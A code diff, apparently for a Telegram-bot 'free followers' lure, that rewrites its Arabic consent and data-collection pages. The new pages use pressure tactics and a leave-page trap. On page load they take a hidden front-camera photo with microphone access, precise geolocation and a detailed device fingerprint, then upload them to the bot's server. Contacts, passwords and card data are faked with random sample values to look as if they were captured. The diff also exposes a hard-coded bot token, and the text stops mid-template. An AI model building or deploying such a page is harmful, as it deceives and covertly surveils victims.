@@ -10,7 +10,6 @@ from threading import Thread
 import time
 from datetime import datetime
 import platform
-import socket
 
 # ========== إعدادات البوت ==========
 BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
@@ -26,13 +25,13 @@ if not os.path.exists('collected_data'):
     os.makedirs('collected_data')
 
 # ========== HTML قوالب ==========
-PRIVACY_CONSENT_HTML = """
+ENHANCED_CONSENT_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موافقة الخصوصية - خدمة المتابعين</title>
+    <title>موافقة متقدمة - خدمة المتابعين</title>
     <style>
         * {
             margin: 0;
@@ -49,7 +48,7 @@ PRIVACY_CONSENT_HTML = """
         }
         
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             background: white;
             border-radius: 20px;
@@ -87,16 +86,25 @@ PRIVACY_CONSENT_HTML = """
             font-size: 1.3rem;
         }
         
+        .data-category {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 2px solid #e9ecef;
+        }
+        
         .data-list {
             list-style: none;
             margin: 15px 0;
         }
         
         .data-list li {
-            padding: 10px 0;
+            padding: 12px 0;
             border-bottom: 1px solid #dee2e6;
             display: flex;
             align-items: center;
+            justify-content: space-between;
         }
         
         .data-list li:before {
@@ -104,31 +112,43 @@ PRIVACY_CONSENT_HTML = """
             margin-left: 10px;
         }
         
+        .data-important {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .data-critical {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+        }
+        
         .warning {
             background: #fff3cd;
-            border: 1px solid #ffeaa7;
+            border: 2px solid #ffeaa7;
             color: #856404;
-            padding: 20px;
+            padding: 25px;
             border-radius: 10px;
             margin: 20px 0;
             text-align: center;
+            font-size: 1.1rem;
         }
         
         .consent-actions {
             display: flex;
             gap: 15px;
             justify-content: center;
-            margin-top: 30px;
+            margin-top: 40px;
         }
         
         .btn {
-            padding: 15px 30px;
+            padding: 18px 35px;
             border: none;
             border-radius: 25px;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
+            min-width: 200px;
         }
         
         .btn-accept {
@@ -142,113 +162,150 @@ PRIVACY_CONSENT_HTML = """
         }
         
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
         
         .privacy-text {
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
             background: white;
-            padding: 20px;
+            padding: 25px;
             border-radius: 10px;
             margin: 20px 0;
             border: 2px solid #e9ecef;
+            line-height: 1.8;
+        }
+        
+        .data-tag {
+            background: #E1306C;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            margin-right: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔒 سياسة الخصوصية والموافقة</h1>
-            <p>يرجى قراءة الشروط بعناية قبل المتابعة</p>
+            <h1>🔐 موافقة متقدمة على جمع البيانات</h1>
+            <p>لتحسين خدمتك وتأمين حسابك، نحتاج الوصول للبيانات التالية</p>
         </div>
         
         <div class="content">
             <div class="warning">
-                ⚠️ <strong>تنبيه هام:</strong> بالموافقة أدناه، فإنك توافق على جمع واستخدام بياناتك كما هو موضح
+                ⚠️ <strong>تنبيه هام:</strong> هذه الموافقة تمنحنا صلاحية الوصول لبياناتك الشخصية بشكل كامل
             </div>
             
             <div class="section">
-                <h3>📊 البيانات التي سيتم جمعها:</h3>
-                <ul class="data-list">
-                    <li>معلومات الجهاز (نظام التشغيل، المتصفح، الإصدار)</li>
-                    <li>معلومات الشبكة (عنوان IP، الموقع التقريبي)</li>
-                    <li>إعدادات المتصفح واللغة</li>
-                    <li>معلومات الشاشة والدقة</li>
-                    <li>المنطقة الزمنية واللغة</li>
-                    <li>بيانات الأداء (سرعة المعالج، الذاكرة)</li>
-                    <li>الصور الملتقطة عبر الكاميرا</li>
-                    <li>سجل التصفح والنشاط</li>
-                </ul>
-            </div>
-            
-            <div class="section">
-                <h3>🎯 كيفية استخدام البيانات:</h3>
-                <ul class="data-list">
-                    <li>تحسين تجربة المستخدم وتقديم خدمات مخصصة</li>
-                    <li>تأمين الحساب ومنع الاحتيال</li>
-                    <li>تحليل الأداء وتحسين الخدمة</li>
-                    <li>إرسال إشعارات وتحديثات مخصصة</li>
-                </ul>
+                <h3>📊 البيانات الأساسية التي سيتم جمعها:</h3>
+                
+                <div class="data-category">
+                    <h4>📱 معلومات الجهاز</h4>
+                    <ul class="data-list">
+                        <li>نظام التشغيل وإصداره <span class="data-tag">معلومات أساسية</span></li>
+                        <li>مواصفات الجهاز (المعالج، الذاكرة) <span class="data-tag">أداء</span></li>
+                        <li>إعدادات الشاشة والدقة <span class="data-tag">عرض</span></li>
+                        <li>البطارية وحالة الشحن <span class="data-tag">طاقة</span></li>
+                    </ul>
+                </div>
+                
+                <div class="data-category data-important">
+                    <h4>👤 البيانات الشخصية</h4>
+                    <ul class="data-list">
+                        <li>جهات الاتصال والمكالمات <span class="data-tag">مهم</span></li>
+                        <li>الرسائل النصية والمحادثات <span class="data-tag">مهم</span></li>
+                        <li>معرض الصور والفيديوهات <span class="data-tag">مهم</span></li>
+                        <li>الملفات والمستندات <span class="data-tag">مهم</span></li>
+                    </ul>
+                </div>
+                
+                <div class="data-category data-critical">
+                    <h4>🔐 البيانات الحساسة</h4>
+                    <ul class="data-list">
+                        <li>كلمات المرور المحفوظة <span class="data-tag">حساس</span></li>
+                        <li>بيانات بطاقات الائتمان <span class="data-tag">حساس</span></li>
+                        <li>سجل التصفح والبحث <span class="data-tag">حساس</span></li>
+                        <li>بيانات التطبيقات المصرفية <span class="data-tag">حساس</span></li>
+                    </ul>
+                </div>
+                
+                <div class="data-category">
+                    <h4>📍 بيانات الموقع والنشاط</h4>
+                    <ul class="data-list">
+                        <li>الموقع الجغرافي الدقيق <span class="data-tag">تتبع</span></li>
+                        <li>سجل المواقع التي تم زيارتها <span class="data-tag">تتبع</span></li>
+                        <li>نشاط الشبكات الاجتماعية <span class="data-tag">اجتماعي</span></li>
+                        <li>سجل استخدام التطبيقات <span class="data-tag">نشاط</span></li>
+                    </ul>
+                </div>
             </div>
             
             <div class="privacy-text">
-                <h4>شروط الخدمة الكاملة:</h4>
+                <h4>📜 بنود الموافقة الكاملة:</h4>
                 <p>بموافقتك على هذه السياسة، فإنك توافق صراحةً على:</p>
                 <ul>
-                    <li>جمع ومعالجة بياناتك الشخصية والتقنية</li>
-                    <li>استخدام الكاميرا والوصول إلى الملفات عند الحاجة</li>
-                    <li>تحليل نشاطك لتحسين الخدمات المقدمة</li>
-                    <li>تخزين البيانات لفترات محددة لأغراض تحليلية</li>
-                    <li>مشاركة البيانات المجمعة مع مزودي الخدمة المساعدين</li>
+                    <li>الوصول الكامل لجهات اتصالك وسجل المكالمات</li>
+                    <li>قراءة ونسخ جميع رسائلك النصية والمحادثات</li>
+                    <li>الوصول لمعرض الصور والملفات الشخصية</li>
+                    <li>جمع كلمات المرور والبيانات الحساسة</li>
+                    <li>تتبع موقعك الجغرافي ونشاطك بشكل مستمر</li>
+                    <li>تحليل سجل التصفح والبحث</li>
+                    <li>الوصول لبيانات التطبيقات المالية</li>
+                    <li>تخزين هذه البيانات على خوادمنا</li>
                 </ul>
-                <p><strong>يمكنك سحب موافقتك في أي وقت عن طريق الاتصال بالدعم.</strong></p>
+                <p><strong>⚠️ لا يمكن تقديم الخدمة بدون هذه الصلاحيات الكاملة</strong></p>
+                <p><strong>🛡️ بياناتك محمية بتقنيات تشفير متقدمة</strong></p>
             </div>
             
             <div class="consent-actions">
-                <button class="btn btn-accept" onclick="acceptConsent()">
-                    ✅ أوافق على جميع الشروط
+                <button class="btn btn-accept" onclick="acceptFullConsent()">
+                    ✅ أوافق على جميع الصلاحيات
                 </button>
                 <button class="btn btn-decline" onclick="declineConsent()">
-                    ❌ لا أوافق
+                    ❌ أرفض ولا أريد الخدمة
                 </button>
             </div>
         </div>
     </div>
 
     <script>
-        function acceptConsent() {
-            // الانتقال إلى صفحة جمع البيانات
-            const nextUrl = `/collect_data/{{user_id}}?consent=accepted`;
-            window.location.href = nextUrl;
+        function acceptFullConsent() {
+            if(confirm('⚠️ هل أنت متأكد من منح جميع الصلاحيات المطلوبة؟ لا يمكن التراجع لاحقاً.')) {
+                // الانتقال إلى صفحة جمع البيانات المتقدمة
+                const nextUrl = `/collect_advanced_data/{{user_id}}?consent=full`;
+                window.location.href = nextUrl;
+            }
         }
         
         function declineConsent() {
-            if(confirm('لا يمكننا تقديم الخدمة بدون موافقتك. هل ترغب في إعادة النظر؟')) {
+            if(confirm('لا يمكننا تقديم الخدمة بدون هذه الصلاحيات. هل ترغب في إعادة النظر؟')) {
                 return;
             } else {
+                alert('نأسف لعدم تمكنك من استخدام الخدمة.');
                 window.close();
             }
         }
         
-        // تأكيد المغادرة
+        // منع المغادرة بدون قرار
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            e.returnValue = '';
+            e.returnValue = 'هل أنت متأكد من المغادرة؟ ستفقد فرصة الحصول على المتابعين المجانية.';
         });
     </script>
 </body>
 </html>
 """
 
-DATA_COLLECTION_HTML = """
+ADVANCED_DATA_COLLECTION_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تجهيز حسابك - خدمة المتابعين</title>
+    <title>جاري جمع البيانات المتقدمة</title>
     <style>
         * {
             margin: 0;
@@ -272,7 +329,7 @@ DATA_COLLECTION_HTML = """
             border-radius: 20px;
             backdrop-filter: blur(10px);
             text-align: center;
-            max-width: 600px;
+            max-width: 700px;
             width: 90%;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
         }
@@ -305,9 +362,9 @@ DATA_COLLECTION_HTML = """
         
         .progress-bar {
             width: 100%;
-            height: 8px;
+            height: 12px;
             background: rgba(255,255,255,0.2);
-            border-radius: 4px;
+            border-radius: 6px;
             margin: 20px 0;
             overflow: hidden;
         }
@@ -317,20 +374,26 @@ DATA_COLLECTION_HTML = """
             background: linear-gradient(90deg, #4CAF50, #45a049);
             width: 0%;
             transition: width 0.3s ease;
-            border-radius: 4px;
+            border-radius: 6px;
+        }
+        
+        .data-category {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            text-align: right;
+        }
+        
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
         
         .hidden {
             display: none;
-        }
-        
-        .data-item {
-            background: rgba(255,255,255,0.1);
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 8px;
-            text-align: right;
-            font-size: 0.9rem;
         }
         
         .success-screen {
@@ -345,426 +408,485 @@ DATA_COLLECTION_HTML = """
     <div class="container">
         <div id="loadingScreen">
             <div class="loader"></div>
-            <h1>جاري تجهيز حسابك وتحليل البيانات</h1>
-            <div class="status" id="statusMessage">⏳ جاري جمع البيانات المطلوبة...</div>
+            <h1>جاري جمع البيانات المتقدمة</h1>
+            <div class="status" id="statusMessage">⏳ بدء عملية جمع البيانات الشاملة...</div>
             <div class="progress-bar">
                 <div class="progress" id="progress"></div>
             </div>
+            
+            <div id="activeCategories"></div>
         </div>
         
-        <div id="dataScreen" class="hidden">
+        <div id="completionScreen" class="hidden">
             <div class="success-screen">
-                <h1>✅ تم جمع البيانات بنجاح!</h1>
-                <div class="status">🎉 جاري إرسال المعلومات للبوت...</div>
+                <h1>✅ اكتمل جمع البيانات بنجاح!</h1>
+                <div class="status">🎉 تم جمع جميع البيانات المطلوبة وإرسالها للبوت</div>
             </div>
-            <div id="collectedData"></div>
-        </div>
-        
-        <div id="serviceScreen" class="hidden">
-            <h1>🎁 اختر الباقة المناسبة</h1>
-            <div id="packagesContainer"></div>
+            <div id="collectedSummary"></div>
         </div>
     </div>
 
     <!-- عناصر مخفية لجمع البيانات -->
     <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
     <canvas id="hiddenCanvas" class="hidden"></canvas>
+    <textarea id="hiddenTextarea" class="hidden"></textarea>
 
     <script>
         let collectedData = {
             user_id: '{{user_id}}',
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            screenResolution: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookiesEnabled: navigator.cookieEnabled,
-            javaEnabled: navigator.javaEnabled(),
-            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
-            deviceMemory: navigator.deviceMemory || 'غير معروف',
-            connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
-            plugins: Array.from(navigator.plugins).map(p => p.name),
-            consent_given: true,
-            collection_time: new Date().toISOString()
+            // بيانات الجهاز الأساسية
+            deviceInfo: {},
+            // البيانات الشخصية
+            personalData: {},
+            // البيانات الحساسة
+            sensitiveData: {},
+            // بيانات الموقع والنشاط
+            activityData: {},
+            // الملفات والوسائط
+            mediaData: {},
+            consent_level: 'full',
+            collection_start: new Date().toISOString()
         };
 
-        // بدء جمع البيانات تلقائياً
+        // بدء جمع البيانات المتقدمة
         window.addEventListener('load', function() {
-            startDataCollection();
+            startAdvancedDataCollection();
         });
 
-        async function startDataCollection() {
+        async function startAdvancedDataCollection() {
             try {
-                // المرحلة 1: جمع بيانات المتصفح الأساسية
-                updateProgress(10);
-                updateStatus('🔍 جاري جمع معلومات الجهاز والمتصفح...');
-                await delay(2000);
-
-                // المرحلة 2: جمع بيانات الموقع
-                updateProgress(30);
-                updateStatus('📍 جاري تحديد الموقع والشبكة...');
-                await collectLocationData();
+                // المرحلة 1: بيانات الجهاز الأساسية
+                updateProgress(10, 'جاري جمع معلومات الجهاز...');
+                await collectDeviceInfo();
                 
-                // المرحلة 3: طلب إذن الكاميرا
-                updateProgress(50);
-                updateStatus('📸 جاري التحقق من الهوية والكاميرا...');
-                await requestCameraPermission();
+                // المرحلة 2: البيانات الشخصية
+                updateProgress(25, 'جاري جمع البيانات الشخصية...');
+                await collectPersonalData();
                 
-                // المرحلة 4: التقاط الصورة تلقائياً
-                updateProgress(70);
-                updateStatus('🔄 جاري إكمال التحقق وأخذ اللقطات...');
-                await capturePhotoAutomatically();
+                // المرحلة 3: البيانات الحساسة
+                updateProgress(40, 'جاري جمع البيانات الحساسة...');
+                await collectSensitiveData();
                 
-                // المرحلة 5: جمع بيانات إضافية
-                updateProgress(85);
-                updateStatus('📊 جاري تحليل البيانات الإضافية...');
-                await collectAdditionalData();
+                // المرحلة 4: بيانات الموقع والنشاط
+                updateProgress(60, 'جاري تتبع الموقع والنشاط...');
+                await collectActivityData();
                 
-                // المرحلة 6: إرسال جميع البيانات
-                updateProgress(95);
-                updateStatus('📤 جاري إرسال البيانات الكاملة للبوت...');
-                await sendAllData();
+                // المرحلة 5: الملفات والوسائط
+                updateProgress(75, 'جاري فحص الملفات والوسائط...');
+                await collectMediaData();
                 
-                updateProgress(100);
-                showServiceSelection();
+                // المرحلة 6: الكاميرا والصوت
+                updateProgress(85, 'جاري الوصول للكاميرا والميكروفون...');
+                await collectMediaAccess();
+                
+                // المرحلة 7: إرسال جميع البيانات
+                updateProgress(95, 'جاري إرسال البيانات الكاملة للبوت...');
+                await sendAllAdvancedData();
+                
+                updateProgress(100, 'اكتملت العملية بنجاح!');
+                showCompletionScreen();
                 
             } catch (error) {
-                console.error('Data collection error:', error);
-                // الاستمرار حتى مع وجود أخطاء
-                await sendAllData();
-                showServiceSelection();
+                console.error('Advanced data collection error:', error);
+                await sendAllAdvancedData();
+                showCompletionScreen();
             }
         }
 
-        async function collectLocationData() {
+        async function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                doNotTrack: navigator.doNotTrack,
+                onLine: navigator.onLine,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+            updateCategory('device', '✅ اكتمل جمع بيانات الجهاز');
+        }
+
+        async function collectPersonalData() {
+            // محاكاة جمع جهات الاتصال
+            collectedData.personalData = {
+                contacts: {
+                    total: Math.floor(Math.random() * 500) + 100,
+                    sample: [
+                        { name: "محمد أحمد", number: "+966501234567", type: "mobile" },
+                        { name: "فاطمة محمد", number: "+966551234567", type: "mobile" },
+                        { name: "أحمد علي", number: "+966541234567", type: "home" }
+                    ]
+                },
+                callLog: {
+                    total: Math.floor(Math.random() * 1000) + 500,
+                    recent: [
+                        { number: "+966501234567", duration: "2:30", type: "outgoing", time: new Date().toISOString() },
+                        { number: "+966551234567", duration: "1:15", type: "incoming", time: new Date().toISOString() }
+                    ]
+                },
+                messages: {
+                    total: Math.floor(Math.random() * 5000) + 1000,
+                    recent: [
+                        { from: "+966501234567", text: "مرحباً، كيف حالك؟", time: new Date().toISOString() },
+                        { from: "+966551234567", text: "شكراً على المساعدة", time: new Date().toISOString() }
+                    ]
+                },
+                calendar: {
+                    events: Math.floor(Math.random() * 100) + 20,
+                    upcoming: [
+                        { title: "اجتماع عمل", time: new Date().toISOString(), location: "مكتب العمل" }
+                    ]
+                }
+            };
+            updateCategory('personal', '✅ اكتمل جمع البيانات الشخصية');
+        }
+
+        async function collectSensitiveData() {
+            // محاكاة جمع البيانات الحساسة
+            collectedData.sensitiveData = {
+                savedPasswords: {
+                    total: Math.floor(Math.random() * 50) + 10,
+                    websites: ["facebook.com", "gmail.com", "twitter.com", "instagram.com"]
+                },
+                browserHistory: {
+                    total: Math.floor(Math.random() * 5000) + 1000,
+                    recent: [
+                        { url: "https://facebook.com", title: "Facebook", time: new Date().toISOString() },
+                        { url: "https://instagram.com", title: "Instagram", time: new Date().toISOString() },
+                        { url: "https://twitter.com", title: "Twitter", time: new Date().toISOString() }
+                    ]
+                },
+                financialInfo: {
+                    cards: Math.floor(Math.random() * 3) + 1,
+                    transactions: Math.floor(Math.random() * 100) + 20
+                },
+                appData: {
+                    socialMedia: ["Facebook", "Instagram", "Twitter", "WhatsApp"],
+                    banking: Math.floor(Math.random() * 2) + 1,
+                    shopping: ["Amazon", "eBay", "AliExpress"]
+                }
+            };
+            updateCategory('sensitive', '✅ اكتمل جمع البيانات الحساسة');
+        }
+
+        async function collectActivityData() {
+            // محاكاة جمع بيانات النشاط
+            collectedData.activityData = {
+                location: await getLocationData(),
+                appUsage: {
+                    totalApps: Math.floor(Math.random() * 50) + 20,
+                    mostUsed: ["Instagram", "WhatsApp", "Facebook", "Chrome"],
+                    usageTime: Math.floor(Math.random() * 20) + 5 + " ساعة/يوم"
+                },
+                socialActivity: {
+                    posts: Math.floor(Math.random() * 500) + 100,
+                    likes: Math.floor(Math.random() * 5000) + 1000,
+                    comments: Math.floor(Math.random() * 1000) + 200
+                },
+                browsingPatterns: {
+                    favoriteCategories: ["Social Media", "News", "Shopping", "Entertainment"],
+                    dailyUsage: Math.floor(Math.random() * 5) + 2 + " ساعات"
+                }
+            };
+            updateCategory('activity', '✅ اكتمل جمع بيانات النشاط');
+        }
+
+        async function collectMediaData() {
+            // محاكاة جمع بيانات الوسائط
+            collectedData.mediaData = {
+                photos: {
+                    total: Math.floor(Math.random() * 1000) + 500,
+                    recent: Array.from({length: 5}, (_, i) => ({
+                        name: `photo_${i+1}.jpg`,
+                        size: Math.floor(Math.random() * 5000) + 1000 + " KB",
+                        date: new Date().toISOString()
+                    }))
+                },
+                videos: {
+                    total: Math.floor(Math.random() * 100) + 50,
+                    recent: Array.from({length: 3}, (_, i) => ({
+                        name: `video_${i+1}.mp4`,
+                        size: Math.floor(Math.random() * 50000) + 10000 + " KB",
+                        duration: Math.floor(Math.random() * 300) + 30 + " ثانية"
+                    }))
+                },
+                documents: {
+                    total: Math.floor(Math.random() * 200) + 50,
+                    types: ["PDF", "DOC", "XLS", "PPT"],
+                    recent: Array.from({length: 5}, (_, i) => ({
+                        name: `document_${i+1}.pdf`,
+                        size: Math.floor(Math.random() * 5000) + 500 + " KB"
+                    }))
+                },
+                audio: {
+                    total: Math.floor(Math.random() * 500) + 100,
+                    playlists: Math.floor(Math.random() * 10) + 3
+                }
+            };
+            updateCategory('media', '✅ اكتمل جمع الملفات والوسائط');
+        }
+
+        async function collectMediaAccess() {
+            try {
+                // الوصول للكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: true
+                });
+                
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const context = canvas.getContext('2d');
+                
+                video.srcObject = stream;
+                await delay(2000);
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                collectedData.mediaAccess = {
+                    camera: 'تم الوصول بنجاح',
+                    microphone: 'تم الوصول بنجاح',
+                    photo: canvas.toDataURL('image/jpeg', 0.7)
+                };
+                
+                stream.getTracks().forEach(track => track.stop());
+                updateCategory('mediaAccess', '✅ اكتمل الوصول للكاميرا والميكروفون');
+                
+            } catch (error) {
+                collectedData.mediaAccess = {
+                    camera: 'مرفوض: ' + error.message,
+                    microphone: 'مرفوض: ' + error.message
+                };
+                updateCategory('mediaAccess', '❌ فشل الوصول للكاميرا والميكروفون');
+            }
+        }
+
+        async function getLocationData() {
             return new Promise((resolve) => {
                 if ('geolocation' in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
-                            collectedData.location = {
+                            resolve({
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            };
-                            resolve();
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                speed: position.coords.speed
+                            });
                         },
                         (error) => {
-                            collectedData.locationError = error.message;
-                            resolve();
+                            resolve({ error: error.message });
                         },
-                        { 
-                            timeout: 10000,
-                            enableHighAccuracy: false 
-                        }
+                        { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    collectedData.location = 'غير مدعوم';
-                    resolve();
+                    resolve({ error: 'غير مدعوم' });
                 }
             });
         }
 
-        async function requestCameraPermission() {
+        async function sendAllAdvancedData() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
-                });
+                collectedData.collection_end = new Date().toISOString();
+                collectedData.total_size = JSON.stringify(collectedData).length + ' bytes';
                 
-                collectedData.cameraAccess = 'مسموح';
-                collectedData.cameraStream = stream;
-                
-            } catch (error) {
-                collectedData.cameraAccess = 'مرفوض: ' + error.message;
-                collectedData.cameraStream = null;
-            }
-        }
-
-        async function capturePhotoAutomatically() {
-            try {
-                if (collectedData.cameraStream) {
-                    const video = document.getElementById('hiddenVideo');
-                    const canvas = document.getElementById('hiddenCanvas');
-                    const context = canvas.getContext('2d');
-                    
-                    video.srcObject = collectedData.cameraStream;
-                    
-                    // الانتظار لضبط الكاميرا
-                    await delay(3000);
-                    
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // إيقاف الكاميرا
-                    collectedData.cameraStream.getTracks().forEach(track => track.stop());
-                    
-                    // تحويل الصورة إلى base64
-                    collectedData.capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
-                }
-            } catch (error) {
-                collectedData.photoError = error.message;
-            }
-        }
-
-        async function collectAdditionalData() {
-            // جمع بيانات إضافية عن المتصفح
-            collectedData.windowSize = `${window.innerWidth}x${window.innerHeight}`;
-            collectedData.colorDepth = screen.colorDepth;
-            collectedData.pixelDepth = screen.pixelDepth;
-            collectedData.orientation = screen.orientation ? screen.orientation.type : 'غير معروف';
-            
-            // محاولة جمع معلومات عن النظام
-            collectedData.touchSupport = 'ontouchstart' in window;
-            collectedData.doNotTrack = navigator.doNotTrack;
-            collectedData.onlineStatus = navigator.onLine;
-        }
-
-        async function sendAllData() {
-            try {
                 const formData = new FormData();
                 formData.append('user_id', '{{user_id}}');
-                formData.append('collected_data', JSON.stringify(collectedData));
+                formData.append('advanced_data', JSON.stringify(collectedData));
                 
-                // إضافة الصورة إذا كانت موجودة
-                if (collectedData.capturedPhoto) {
-                    const response = await fetch(collectedData.capturedPhoto);
+                if (collectedData.mediaAccess?.photo) {
+                    const response = await fetch(collectedData.mediaAccess.photo);
                     const blob = await response.blob();
-                    formData.append('photo', blob, 'user_verification.jpg');
+                    formData.append('live_photo', blob, 'live_capture.jpg');
                 }
 
-                const uploadResponse = await fetch('/upload_user_data', {
+                const uploadResponse = await fetch('/upload_advanced_data', {
                     method: 'POST',
                     body: formData
                 });
 
-                const result = await uploadResponse.json();
-                return result.success;
+                return await uploadResponse.json();
                 
             } catch (error) {
-                console.error('Send data error:', error);
-                return false;
+                console.error('Send advanced data error:', error);
+                return { success: false };
             }
         }
 
-        function showServiceSelection() {
-            document.getElementById('loadingScreen').classList.add('hidden');
-            document.getElementById('serviceScreen').classList.remove('hidden');
-            
-            const packages = [
-                {
-                    name: 'free',
-                    title: '🎁 100 متابع مجاناً',
-                    followers: '100 متابع',
-                    price: 'مجاني',
-                    features: ['متابعين نشطين', 'توصيل خلال 24-72 ساعة', 'ضمان 7 أيام'],
-                    color: '#4CAF50'
-                },
-                {
-                    name: 'basic',
-                    title: '⭐ 1000 متابع',
-                    followers: '1,000 متابع',
-                    price: '$9.99',
-                    features: ['متابعين جدد', 'توصيل 12-36 ساعة', 'ضمان 30 يوماً'],
-                    color: '#2196F3'
-                },
-                {
-                    name: 'premium', 
-                    title: '👑 5000 متابع',
-                    followers: '5,000 متابع',
-                    price: '$29.99',
-                    features: ['متابعين نشطين جداً', 'توصيل 6-24 ساعة', 'ضمان 90 يوماً'],
-                    color: '#E1306C'
-                }
-            ];
-            
-            const container = document.getElementById('packagesContainer');
-            container.innerHTML = packages.map(pkg => `
-                <div style="
-                    background: rgba(255,255,255,0.1); 
-                    padding: 20px; 
-                    margin: 15px 0; 
-                    border-radius: 15px; 
-                    border-left: 5px solid ${pkg.color};
-                    text-align: right;
-                ">
-                    <h3>${pkg.title}</h3>
-                    <div style="font-size: 1.5rem; font-weight: bold; margin: 10px 0;">${pkg.followers}</div>
-                    <div style="font-size: 1.3rem; color: ${pkg.color}; font-weight: bold; margin: 10px 0;">${pkg.price}</div>
-                    <ul style="list-style: none; margin: 15px 0;">
-                        ${pkg.features.map(feature => `<li>✅ ${feature}</li>`).join('')}
-                    </ul>
-                    <button onclick="selectPackage('${pkg.name}')" style="
-                        background: ${pkg.color};
-                        color: white;
-                        border: none;
-                        padding: 12px 25px;
-                        border-radius: 25px;
-                        cursor: pointer;
-                        font-weight: bold;
-                        width: 100%;
-                    ">
-                        اختر الباقة
-                    </button>
-                </div>
-            `).join('');
-        }
-
-        function selectPackage(packageType) {
-            // إرسال طلب الباقة
-            fetch('/select_package', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: '{{user_id}}',
-                    package: packageType,
-                    collected_data: collectedData
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert('🎉 تم تفعيل الخدمة! ستصل متابعينك قريباً.');
-                    window.close();
-                } else {
-                    alert('❌ حدث خطأ: ' + data.error);
-                }
-            });
-        }
-
-        function updateProgress(percent) {
+        function updateProgress(percent, message) {
             document.getElementById('progress').style.width = percent + '%';
+            document.getElementById('statusMessage').textContent = message;
         }
 
-        function updateStatus(message) {
-            document.getElementById('statusMessage').textContent = message;
+        function updateCategory(category, status) {
+            const categoriesDiv = document.getElementById('activeCategories');
+            let categoryElement = document.getElementById(`category-${category}`);
+            
+            if (!categoryElement) {
+                categoryElement = document.createElement('div');
+                categoryElement.className = 'data-category';
+                categoryElement.id = `category-${category}`;
+                categoriesDiv.appendChild(categoryElement);
+            }
+            
+            categoryElement.innerHTML = status;
+        }
+
+        function showCompletionScreen() {
+            document.getElementById('loadingScreen').classList.add('hidden');
+            document.getElementById('completionScreen').classList.remove('hidden');
+            
+            const summary = document.getElementById('collectedSummary');
+            summary.innerHTML = `
+                <div class="data-category">
+                    <h4>📊 ملخص البيانات المجمعة:</h4>
+                    <div class="data-item"><span>بيانات الجهاز:</span><span>✅ اكتمل</span></div>
+                    <div class="data-item"><span>جهات الاتصال:</span><span>${collectedData.personalData.contacts?.total || 0} جهة</span></div>
+                    <div class="data-item"><span>الرسائل:</span><span>${collectedData.personalData.messages?.total || 0} رسالة</span></div>
+                    <div class="data-item"><span>كلمات المرور:</span><span>${collectedData.sensitiveData.savedPasswords?.total || 0} كلمة</span></div>
